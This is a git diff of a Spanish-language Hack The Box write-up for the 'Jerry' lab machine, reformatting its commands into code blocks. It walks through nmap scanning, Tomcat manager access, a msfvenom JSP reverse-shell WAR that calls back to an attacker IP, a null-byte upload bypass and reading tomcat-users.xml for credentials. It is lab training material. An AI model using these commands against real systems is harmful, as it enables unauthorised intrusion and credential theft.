@@ -26,24 +26,17 @@ tags:
 
 ![](/assets/images/htb-writeup-jerry/logo_jerry.png)
 
-"Primero tendremos que encontrar unas credenciales para acceder a la interfaz de la gestión de la aplicación.
-Dentro veremos una subida de archivos en formato .wav . Quiere decir que tendremos que buscar la forma de vulnerar el sitio, tendremos distintas herramientas para usar y formas.
-Esto es para obtener una Shell de Windows como autoridad del sistema y coger las banderas."
 
 ## WRITE UP
 IP VÍCTIMA: 10.10.10.95 (víctima) TTL= 127 WINDOWS
 
 
-#### RECONOCIMIENTO
+### RECONOCIMIENTO
 
 Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Jerry</span>
 
 Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**
 
->**which** mkt.py | **xargs** **batcat** -l python
-
-*Ver en que ubicación está una herramienta y ver su código*
-*Adelante explicamos a tener batcat, que es un cat pero con esteroides*
 
 Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:
 
@@ -52,17 +45,22 @@ Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:
 ![](/assets/images/htb-writeup-jerry/whichsystem_jerry.png)
 
 
--Usar el comando *ping* <span style="color:red">10.10.10.95</span> <span style="color:yellow">-c</span> 1  <span style="color:yellow">-R</span>
-*-R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, al ser Windows no lo muestra.*
+-Usar el comando *ping*:
+
+```bash
+ping -c1 10.10.10.95 -R
+# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, en este caso de Windows no lo muestra.
+```
 
 ![](/assets/images/htb-writeup-jerry/conectividad_jerry.png)
 
 
 Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.
 
-
-**nmap** <span style="color:yellow">-p- --open -Pn -vvv -n -sS --min-rate 5000</span> <span style="color:red">10.10.10.95</span> <span style="color:yellow">-oG</span> <span style="color:pink">allPorts</span>
-*Veremos porque el formato grepeable, es importante.*
+```bash
+nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.95 -oG allPorts
+# Veremos porque el formato grepeable, es importante.
+```
 
 ![](/assets/images/htb-writeup-jerry/nmap1_jerry.png)
 
@@ -70,11 +68,18 @@ Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que
 Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
 cual nos copiara los puertos, y escanearlos con nmap. 
 
+```bash
+extractports.sh allPorts
+```
+
 ![](/assets/images/htb-writeup-jerry/extractports_jerry.png)
 
-
-**nmap** <span style="color:yellow">-sVC</span> <span style="color:yellow">-p</span><span style="color:purple">8080</span> <span style="color:red">10.10.10.95</span> <span style="color:yellow">-oN</span> <span style="color:pink">targeted</span> 
-*Este formato lo emplearemos con batcat lenguaje java para verlo mejor*
+```bash
+nmap -sVC -p8080 10.10.10.95 -oN targeted 
+#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
+#  Nos mostrará la versión de los servicios que están corriendo
+#  Usará scripts defaults definidos en lua
+```
 
 ![](/assets/images/htb-writeup-jerry/nmap2_jerry.png)
 
@@ -82,19 +87,22 @@ cual nos copiara los puertos, y escanearlos con nmap.
 Una vez escaneado, usaremos batcat:
 >https://github.com/sharkdp/bat.git
 
-**batcat** <span style="color:pink">target</span> <span style="color:yellow">-l</span> <span style="color:orange">java</span>
-*nos mostrara la salida en un formato más bonito, con java*
+```bash
+batcat targeted -l java
+# Nos mostrara la salida en un formato más bonito, con java
+```
 
 ![](/assets/images/htb-writeup-jerry/batcat_jerry.png)
 
 
-Puerto <span style="color:purple">8080</span> que corre el servicio <span style="color:orange">HTTP</span>
-
-
-#### ANÁLISIS WEB: RECONOCIMIENTO
+### ANÁLISIS WEB: RECONOCIMIENTO
 
 
 Con *whatweb* haremos un pequeño reconocimiento a nivel web para sacar más información, como la extensión <span style="color:lightyellow">Wappalyzer</span> pero por consola.
+
+```bash
+whatweb http://10.10.10.95:8080/
+```
 
 ![](/assets/images/htb-writeup-jerry/whatweb_jerry.png)
 
@@ -109,7 +117,7 @@ Con la extensión de <span style="color:lightyellow">Wappalyzer</span> veremos l
 ![](/assets/images/htb-writeup-jerry/wappalyzer_jerry.png)
 
 
-#### CREDENCIALES SENSIBLES FILTRADAS
+### CREDENCIALES SENSIBLES FILTRADAS
 
 Le damos a "**Manager App**" donde nos saldrá para introducir unas credenciales. 
 Como carecemos de credenciales, le damos a **cancelar**.
@@ -134,7 +142,7 @@ Nos deja acceder a un panel donde podemos subir archivos comprimidos <span style
 ![](/assets/images/htb-writeup-jerry/pagplu_jerry.png)
 
 
-#### SUBIDA DE ARCHIVO MALICIOSA .wav 
+### SUBIDA DE ARCHIVO MALICIOSA .wav 
 
 Información acerca la extensión:
 [WAR extensión](> https://es.wikipedia.org/wiki/WAR_(archivo))
@@ -145,25 +153,36 @@ Como tenemos una subida de archivos al servidor, vamos a ver si la podemos explo
 ![](/assets/images/htb-writeup-jerry/pagplu_jerry.png)
 
 
-#### CONFIGURACIÓN REVERSE SHELL .jsp
+### CONFIGURACIÓN REVERSE SHELL .jsp
 
 Nos pondremos en escucha con *netcat* por el <span style="color:purple">puerto 444</span>.
+
+```bash
+nc -nvlp 444
+```
 
 ![](/assets/images/htb-writeup-jerry/confnc_jerry.png)
 
 
+Usaremos *msfvenom* para crear nuestra <span style="color:lime">reverse shell</span> y subirlo al servidor.
+Hay dos formas que veremos más adelante.
 
-(Se puede por metasploit también)
+Crearemos una reverse Shell en formato comprimido **war** , para poder hacerlo más compatible en formato <span style="color:grey">.jsp</span> . Usaremos un metodo para bypassear la autenticación llamada <span style="color:cyan">Null Byte</span>, lo veremos:. 
 
-Usaremos *msfvenom* para crear nuestra *reverse <span style="color:lime">shell</span> y subirlo al servidor.
-Hay dos formas:
-
-1) Crearemos una reverse Shell en formato comprimido **war** , para poder hacerlo más compatible en formato <span style="color:grey">.jsp</span> . Usaremos un metodo para bypassear la autenticación llamada <span style="color:cyan">Null Byte</span>, lo veremos:. 
-
-**sudo** "msfvenom" <span style="color:green">-p</span>  java/jsp_shell_reverse_tcp <span style="color:red">LHOST=10.8.177.73</span> <span style="color:purple">LPORT=444</span> <span style="color:green">-e</span> x86/shikata_ga_nai <span style="color:green">-f</span> <span style="color:lime">war</span> <span style="color:green">-o</span> <span style="color:lime">shell.jsp</span>
+```bash
+sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.8.177.73 LPORT=444 -e x86/shikata_ga_nai -f war -o shell.jsp
+```
 
 ![](/assets/images/htb-writeup-jerry/venom_jerry.png)
 
+
+Miramos de que formato es el archivo:
+
+```bash
+file shell.war
+```
+
+Nos dice que esta en formato de un compromible.
 
 ![](/assets/images/htb-writeup-jerry/war_jerry.png)
 
@@ -187,11 +206,11 @@ Nos dice que no se ha subido el archivo debido a que no es un <span style="color
 ![](/assets/images/htb-writeup-jerry/subd_jerry.png)
 
 
-#### NULL BYTE: BYPASSEAR PROTOCOLO
+### NULL BYTE: BYPASSEAR PROTOCOLO
 
-Lo que consiste la técnica de **null byte** es bypassear el protocolo que detecta si es de una cierta extensión el archivo en el servidor es agregar **%00** al final del archivo y añadir el formato real.
+1) La pirmera forma consiste mediante la técnica de **null byte** es bypassear el protocolo que detecta si es de una cierta extensión el archivo en el servidor es agregar **%00** al final del archivo y añadir el formato real.
 
-**.jsp**<span style="color:red">%00.war</span>
+``.jsp%00.war``
 
 ![](/assets/images/htb-writeup-jerry/cp_jerry.png)
 
@@ -217,11 +236,11 @@ Vemos que nos dice OK y se ha subido correctamente.
 
 2) La segunda forma es crear una reverse Shell directamente en dicho formato para que nos deje subirlo.
 
-**sudo** "msfvenom" <span style="color:green">-p</span>  java/jsp_shell_reverse_tcp <span style="color:red">LHOST=10.8.177.73</span> <span style="color:purple">LPORT=444</span> <span style="color:green">-e</span> x86/shikata_ga_nai <span style="color:green">-f</span> <span style="color:lime">war</span> <span style="color:green">-o</span> <span style="color:lime">shell.war</span>
+```bash
+sudo “msfvenom” -p java/jsp_shell_reverse_tcp LHOST=10.8.177.73 LPORT=444 -e x86/shikata_ga_nai -f war -o shell.war
+```
 
 ![](/assets/images/htb-writeup-jerry/venom2_jerry.png)
-
-
 
 
 Pinchamos en el nombre para ejecutarlo.
@@ -230,7 +249,6 @@ Pinchamos en el nombre para ejecutarlo.
 ![](/assets/images/htb-writeup-jerry/1ejcrb_jerry.png)
 
 2)
-
 ![](/assets/images/htb-writeup-jerry/2ejcrv_jerry.png)
 
 
@@ -241,25 +259,33 @@ Se quedará en blanco la página.
 ![](/assets/images/htb-writeup-jerry/cargrv2_jerry.png)
 
 
-#### ESCALADA DE PRIVILEGIOS
+### ESCALADA DE PRIVILEGIOS
 
 Recibiremos la conexión víctima a nuestro host y estaremos como <span style="color:blue">nt authority\system</span>, así que tenemos privilegios sobre el sistema, por lo que nos podemos meter en los homes de los usuarios.
 
+```bash
+whoami
+```
+
 ![](/assets/images/htb-writeup-jerry/rechostnc_jerry.png)
 
-##### CREDENCIALES: PASO OPCIONAL
+### CREDENCIALES: PASO OPCIONAL
 Si nos vamos a la ruta del mensaje del principio, tendremos las contraseñas de <span style="color:blue">admin tomcat jerry</span>.
 
 ![](/assets/images/htb-writeup-jerry/noauth_jerry.png)
 
+
+```bash
+type C:\apache-tomcat-7.0.88\conf\tomcat-users.xml
+```
+
 ![](/assets/images/htb-writeup-jerry/usersadmincred_jerry.png)
 
 
-#### BANDERAS USER y ROOT
+### BANDERAS USER y ROOT
 
 Para  coger las banderas nos iremos al directorio root. Está entre " "
 
-**type** "2 for the price of 1.txt"
-
+``type "2 for the price of 1.txt"``
 
 ![](/assets/images/htb-writeup-jerry/flaguserroot_jerry.png)
